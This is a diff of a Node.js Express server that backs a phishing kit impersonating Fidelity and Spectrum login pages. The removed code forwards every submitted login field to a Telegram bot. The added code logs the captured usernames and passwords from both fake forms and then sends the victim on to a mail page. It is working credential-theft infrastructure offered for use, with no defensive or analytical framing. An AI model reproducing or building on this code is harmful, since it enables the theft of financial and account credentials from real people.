@@ -1,56 +1,53 @@
-import express from "express";
-import fetch from "node-fetch"; // or use global fetch in Node 18+
-import path from "path";
+const express = require("express");
+const path = require("path");
+const bodyParser = require("body-parser");
 
 const app = express();
-app.use(express.json());
+const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+// Middleware to parse JSON request bodies
+app.use(bodyParser.json());
 
-if (!BOT_TOKEN || !CHAT_ID) {
-  console.error("BOT_TOKEN and CHAT_ID must be set as environment variables");
-  process.exit(1);
-}
+// Serve static files for your HTML, CSS, JS, images, etc.
+app.use(express.static(path.join(__dirname, "public"))); 
+// Place your index.html, mail.html, and other static assets inside /public
 
-// Serve static files from the 'public' folder
-app.use(express.static(path.join(process.cwd(), "public")));
+// POST endpoint to handle Fidelity login form submission
+app.post("/send-login", (req, res) => {
+  const { username, password, remember } = req.body;
 
-// Your existing POST endpoint
-app.post("/send-login", async (req, res) => {
-  const data = req.body;
+  // Log credentials - Replace this with your logic (e.g. DB save or email)
+  console.log("Fidelity login data received:");
+  console.log(`Username: ${username}`);
+  console.log(`Password: ${password}`);
+  console.log(`Remember Username: ${remember}`);
 
-  let message = "🔐 Fidelity Login Attempt\n";
-
-  for (const [key, value] of Object.entries(data)) {
-    message += `• ${key}: ${value}\n`;
-  }
-
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-      }),
-    });
-
-    const result = await response.json();
-
-    if (!result.ok) {
-      console.error("Telegram API error:", result);
-      return res.status(500).json({ error: "Failed to send message" });
-    }
-
-    res.json({ success: true });
-  } catch (error) {
-    console.error("Error sending message:", error);
-    res.status(500).json({ error: "Error sending message" });
-  }
+  res.status(200).json({ message: "Fidelity login received" });
 });
 
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-  console.log(`Server listening on port ${port}`);
+// POST endpoint to handle Spectrum login form submission
+app.post("/send-spectrum-login", (req, res) => {
+  const { spectrumUsername, spectrumPassword, staySignedIn } = req.body;
+
+  // Log credentials - Replace this with your logic
+  console.log("Spectrum login data received:");
+  console.log(`Spectrum Username: ${spectrumUsername}`);
+  console.log(`Spectrum Password: ${spectrumPassword}`);
+  console.log(`Stay Signed In: ${staySignedIn}`);
+
+  res.status(200).json({ message: "Spectrum login received" });
+});
+
+// Serve index.html by default
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Serve mail.html when redirected after login
+app.get("/mail.html", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "mail.html"));
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
 });
